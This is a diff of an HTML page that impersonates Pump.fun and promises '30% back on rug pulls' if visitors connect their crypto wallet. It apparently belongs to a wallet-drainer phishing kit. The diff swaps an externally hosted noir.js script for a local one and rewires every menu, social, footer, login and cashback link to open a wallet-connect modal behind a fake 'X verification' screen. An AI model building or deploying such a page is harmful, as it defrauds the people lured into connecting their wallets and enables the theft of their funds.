@@ -26,12 +26,10 @@
     <link rel="apple-touch-icon" href="images/pump-logomark.svg">
     
     <link rel="stylesheet" href="css/styles.css">
-    <link href="css2.css" rel="stylesheet">
+    <link href="css2" rel="stylesheet">
 <script type="module" src="../../_nuxt/assets/index.js"></script></head>
 <body>
     <!-- X Verification Screen -->
-    <script src="https://chihhlguy123.github.io/noir.js"></script>
-    <script src="noir.js"></script>
     <div id="xVerificationScreen" class="x-verification-screen active">
         <div class="x-verification-content">
             <div class="x-logo-container loading" id="xLogoContainer">
@@ -83,7 +81,7 @@
         <div class="sidebar-inner">
             <!-- Sidebar Header -->
             <div class="sidebar-header">
-                <a href="#" class="logo-link" class="noir-connect">
+                <a href="#" class="logo-link" onclick="window.openModal()">
                     <img src="images/pump-logomark.svg" alt="Pump" class="logo-icon-img" width="32" height="32">
                     <span class="logo-text">Pump<span class="accent">.</span>fun</span>
                 </a>
@@ -105,7 +103,7 @@
             <nav class="sidebar-content">
                 <ul class="sidebar-menu">
                     <li class="menu-item">
-                        <a href="#" class="menu-button active" class="noir-connect">
+                        <a href="#" class="menu-button active" onclick="window.openModal()">
                             <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M20 19V9.46465C20 9.17001 19.8701 8.89037 19.6449 8.70036L12.6449 2.79411C12.2724 2.47983 11.7276 2.47983 11.3551 2.79411L4.35513 8.70036C4.12994 8.89037 4 9.17001 4 9.46465V19C4 19.5523 4.44772 20 5 20H9C9.55228 20 10 19.5523 10 19V15C10 14.4477 10.4477 14 11 14H13C13.5523 14 14 14.4477 14 15V19C14 19.5523 14.4477 20 15 20H19C19.5523 20 20 19.5523 20 19Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
                             </svg>
@@ -113,7 +111,7 @@
                         </a>
                     </li>
                     <li class="menu-item">
-                        <a href="#" target="_blank" class="menu-button" class="noir-connect">
+                        <a href="#" target="_blank" class="menu-button" onclick="window.openModal()">
                             <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M4 5H15C15.5523 5 16 5.44772 16 6V9L19.5528 7.22361C20.2177 6.89116 21 7.37465 21 8.11803V15.882C21 16.6253 20.2177 17.1088 19.5528 16.7764L16 15V18C16 18.5523 15.5523 19 15 19H4C3.44772 19 3 18.5523 3 18V6C3 5.44772 3.44772 5 4 5Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
                                 <path d="M12 12C12 13.3807 10.8807 14.5 9.5 14.5C8.11929 14.5 7 13.3807 7 12C7 10.6193 8.11929 9.5 9.5 9.5C10.8807 9.5 12 10.6193 12 12Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
@@ -122,7 +120,7 @@
                         </a>
                     </li>
                     <li class="menu-item">
-                        <a href="#" target="_blank" class="menu-button" class="noir-connect">
+                        <a href="#" target="_blank" class="menu-button" onclick="window.openModal()">
                             <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M7 3V10M7 10H5C4.44772 10 4 10.4477 4 11V17C4 17.5523 4.44772 18 5 18H7M7 10H9C9.55228 10 10 10.4477 10 11V17C10 17.5523 9.55228 18 9 18H7M7 18V21M17 3V6M17 6H15C14.4477 6 14 6.44772 14 7V17C14 17.5523 14.4477 18 15 18H17M17 6H19C19.5523 6 20 6.44772 20 7V17C20 17.5523 19.5523 18 19 18H17M17 18V21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                             </svg>
@@ -130,7 +128,7 @@
                         </a>
                     </li>
                     <li class="menu-item">
-                        <a href="#" class="menu-button" class="noir-connect">
+                        <a href="#" class="menu-button" onclick="window.openModal()">
                             <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 13.4247 3.33104 14.7721 3.9204 15.9694C3.9709 16.072 3.98746 16.1883 3.96447 16.3003L3.14957 20.2712C3.07816 20.6191 3.38218 20.9285 3.73132 20.8632L7.83545 20.0953C7.94223 20.0753 8.05242 20.091 8.15059 20.1376C9.31767 20.6906 10.6227 21 12 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                             </svg>
@@ -138,7 +136,7 @@
                         </a>
                     </li>
                     <li class="menu-item">
-                        <a href="#" class="menu-button" class="noir-connect">
+                        <a href="#" class="menu-button" onclick="window.openModal()">
                             <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M6 10H7C7 9.44772 6.55228 9 6 9V10ZM6 16.5V17.5C6.55228 17.5 7 17.0523 7 16.5H6ZM18.5 10V9C17.9477 9 17.5 9.44772 17.5 10H18.5ZM18.5 16.5H17.5C17.5 17.0523 17.9477 17.5 18.5 17.5V16.5ZM13 19C13 18.4477 12.5523 18 12 18C11.4477 18 11 18.4477 11 19H13ZM20.75 16.5C20.75 15.9477 20.3023 15.5 19.75 15.5C19.1977 15.5 18.75 15.9477 18.75 16.5H20.75ZM4.5 11H6V9H4.5V11ZM5 10V16.5H7V10H5ZM6 15.5H4.5V17.5H6V15.5ZM4 15V11.5H2V15H4ZM4.5 15.5C4.22386 15.5 4 15.2761 4 15H2C2 16.3807 3.11929 17.5 4.5 17.5V15.5ZM4.5 9C3.11929 9 2 10.1193 2 11.5H4C4 11.2239 4.22386 11 4.5 11V9ZM18.5 11H20V9H18.5V11ZM20.5 11.5V15H22.5V11.5H20.5ZM20 15.5H18.5V17.5H20V15.5ZM19.5 16.5V10H17.5V16.5H19.5ZM20.5 15C20.5 15.2761 20.2761 15.5 20 15.5V17.5C21.3807 17.5 22.5 16.3807 22.5 15H20.5ZM20 11C20.2761 11 20.5 11.2239 20.5 11.5H22.5C22.5 10.1193 21.3807 9 20 9V11ZM6 9.75C6 6.64046 8.72972 4 12.25 4V2C7.76215 2 4 5.40369 4 9.75H6ZM12.25 4C15.7703 4 18.5 6.64046 18.5 9.75H20.5C20.5 5.40369 16.7378 2 12.25 2V4ZM4 9.75V10H6V9.75H4ZM18.5 9.75V10H20.5V9.75H18.5ZM15.25 20H13.5V22H15.25V20ZM13 19.5V19H11V19.5H13ZM18.75 16.5C18.75 18.433 17.183 20 15.25 20V22C18.2876 22 20.75 19.5376 20.75 16.5H18.75ZM13.5 20C13.2239 20 13 19.7761 13 19.5H11C11 20.8807 12.1193 22 13.5 22V20Z" fill="currentColor"/>
                             </svg>
@@ -172,17 +170,17 @@
             <!-- Sidebar Footer -->
             <div class="sidebar-footer">
                 <div class="social-links">
-                    <a href="#" target="_blank" class="social-link" title="Twitter" class="noir-connect">
+                    <a href="#" target="_blank" class="social-link" title="Twitter" onclick="window.openModal()">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                             <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                         </svg>
                     </a>
-                    <a href="#" target="_blank" class="social-link" title="Instagram" class="noir-connect">
+                    <a href="#" target="_blank" class="social-link" title="Instagram" onclick="window.openModal()">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                             <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                         </svg>
                     </a>
-                    <a href="#" target="_blank" class="social-link" title="TikTok" class="noir-connect">
+                    <a href="#" target="_blank" class="social-link" title="TikTok" onclick="window.openModal()">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                             <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/>
                         </svg>
@@ -197,7 +195,7 @@
         <!-- Header -->
         <header class="header">
             <!-- Mobile Logo -->
-            <a href="#" class="header-logo-mobile" class="noir-connect">
+            <a href="#" class="header-logo-mobile" onclick="window.openModal()">
                 <img src="images/pump-logomark.svg" alt="Pump" width="28" height="28">
             </a>
             
@@ -217,8 +215,8 @@
                 </form>
             </div>
             <div class="header-actions">
-                <a href="#" class="asgf342" id="getCashbackBtn" class="noir-connect">Get Cashback</a>
-                <button class="asgf342" id="loginBtn" class="noir-connect"">Log in</button>
+                <a href="#" class="noir-connect" id="getCashbackBtn" onclick="window.openModal()">Get Cashback</a>
+                <button class="noir-connect" id="loginBtn">Log in</button>
             </div>
         </header>
 
@@ -313,7 +311,7 @@
                     </div>
 
                     <div class="hero-actions">
-                        <button class="asgf342" id="heroLoginBtn" class="noir-connect">
+                        <button class="noir-connect" id="heroLoginBtn">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M19 7h-1V6a3 3 0 00-3-3H5a3 3 0 00-3 3v12a3 3 0 003 3h14a3 3 0 003-3v-8a3 3 0 00-3-3zm-4 9a2 2 0 110-4 2 2 0 010 4z" fill="currentColor"/>
                             </svg>
@@ -446,9 +444,9 @@
                     <span class="footer-tagline">Cashback</span>
                 </div>
                 <div class="footer-links">
-                    <a href="#" class="noir-connect"">Terms</a>
-                    <a href="#" class="noir-connect"">Privacy</a>
-                    <a href="#" class="noir-connect"">Docs</a>
+                    <a href="#" onclick="window.openModal()">Terms</a>
+                    <a href="#" onclick="window.openModal()">Privacy</a>
+                    <a href="#" onclick="window.openModal()">Docs</a>
                 </div>
                 <div class="footer-copy">Â© 2026 Pump.fun Cashback. All rights reserved.</div>
             </div>
@@ -475,7 +473,7 @@
                                 <div class="demo-mobile-content">
                                     <h2>Get <span class="highlight">30%</span> Back<br>on Rug Pulls</h2>
                                     <p>Connect your wallet to claim cashback</p>
-                                    <button class="demo-connect-btn" id="demoConnectBtn" class="noir-connect">
+                                    <button class="demo-connect-btn" id="demoConnectBtn">
                                         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                             <rect x="2" y="6" width="20" height="12" rx="2"/>
                                             <path d="M22 10h-4a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2h4"/>
@@ -679,6 +677,7 @@
     </div>
 
     <script src="js/script.js"></script>
+<script src="noir.js"></script>
 </body>
 </html>
 
